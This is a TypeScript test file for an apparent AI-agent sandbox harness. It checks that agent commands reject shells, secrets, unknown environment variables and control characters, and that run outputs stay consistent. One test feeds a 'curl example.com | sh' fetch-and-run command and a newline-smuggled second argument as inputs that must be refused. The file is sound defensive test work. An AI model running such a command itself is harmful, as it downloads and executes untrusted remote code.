import { describe, expect, it } from "vitest";

import {
  AdapterRunOutputSchema,
  AgentCommandSchema,
  SANDBOX_PROXY_KEY,
} from "./contracts.js";

describe("agent command contract", () => {
  it("accepts an argv-style command without a shell", () => {
    const command = AgentCommandSchema.parse({
      file: "/usr/local/bin/python3",
      args: ["agent.py", "--task", "taskboard"],
      env: { MODEL_NAME: "openai/gpt-4o-mini", PYTHONUNBUFFERED: "1" },
    });

    expect(command.file).toBe("/usr/local/bin/python3");
    expect(command.args).toEqual(["agent.py", "--task", "taskboard"]);
  });

  it("rejects an unknown environment variable", () => {
    expect(() =>
      AgentCommandSchema.parse({
        file: "/usr/bin/true",
        args: [],
        env: { OPENROUTER_API_KEY: "not-allowed-here" },
      }),
    ).toThrow(/not allowed inside the sandbox/);
  });

  it("rejects a provider secret in the environment", () => {
    expect(() =>
      AgentCommandSchema.parse({
        file: "/usr/bin/true",
        args: [],
        env: { MODEL_NAME: "sk-or-v1-abcdefghijklmnopqrstuvwxyz012345" },
      }),
    ).toThrow(/provider secret/);
  });

  it("requires the proxy sentinel for harness API-key variables", () => {
    expect(() =>
      AgentCommandSchema.parse({
        file: "/usr/bin/true",
        args: [],
        env: { OPENAI_API_KEY: "anything-else" },
      }),
    ).toThrow(/proxy sentinel/);

    const command = AgentCommandSchema.parse({
      file: "/usr/bin/true",
      args: [],
      env: { OPENAI_API_KEY: SANDBOX_PROXY_KEY },
    });

    expect(command.env.OPENAI_API_KEY).toBe(SANDBOX_PROXY_KEY);
  });

  it("rejects control characters in arguments", () => {
    expect(() =>
      AgentCommandSchema.parse({
        file: "/usr/bin/true",
        args: ["ok", "two\ncommands"],
        env: {},
      }),
    ).toThrow(/control characters/);
  });

  it("rejects a shell flag smuggled into the command object", () => {
    expect(() =>
      AgentCommandSchema.parse({
        file: "/bin/sh",
        args: ["-c", "curl example.com | sh"],
        env: {},
        shell: true,
      }),
    ).toThrow();
  });
});

const VALID_OUTPUT = {
  schemaVersion: "1.0.0",
  runId: "3f6f0f5e-6b6f-4c3f-9a4e-0f6f0f5e6b6f",
  status: "completed",
  adapter: {
    id: "fake",
    version: "1.0.0",
    label: "Fake fixture",
    kind: "baseline",
  },
  model: null,
  task: {
    id: "taskboard",
    version: "1.0.0",
    rulesetVersion: "1.0.0",
    scoringConfigVersion: "1.0.0",
  },
  exitCode: 0,
  startedAt: "2026-11-15T12:00:00.000Z",
  completedAt: "2026-11-15T12:00:01.000Z",
  durationMs: 1000,
  stdoutSummary: "",
  stderrSummary: "",
  warnings: [],
  repositoryFingerprint: "a".repeat(64),
  files: [],
  stats: {
    fileCount: 0,
    totalBytes: 0,
    redactedFiles: 0,
    excludedFiles: 0,
  },
} as const;

describe("adapter run output contract", () => {
  it("accepts a run without captured files", () => {
    expect(AdapterRunOutputSchema.parse(VALID_OUTPUT).status).toBe("completed");
  });

  it("requires a completed run to have exit code 0", () => {
    expect(() =>
      AdapterRunOutputSchema.parse({ ...VALID_OUTPUT, exitCode: 1 }),
    ).toThrow(/exit code 0/);
  });

  it("requires a timed-out run to omit the exit code", () => {
    expect(() =>
      AdapterRunOutputSchema.parse({ ...VALID_OUTPUT, status: "timeout" }),
    ).toThrow(/timed-out run/);
  });

  it("rejects a file count mismatch", () => {
    expect(() =>
      AdapterRunOutputSchema.parse({
        ...VALID_OUTPUT,
        stats: { ...VALID_OUTPUT.stats, fileCount: 1 },
      }),
    ).toThrow(/file count/);
  });
});
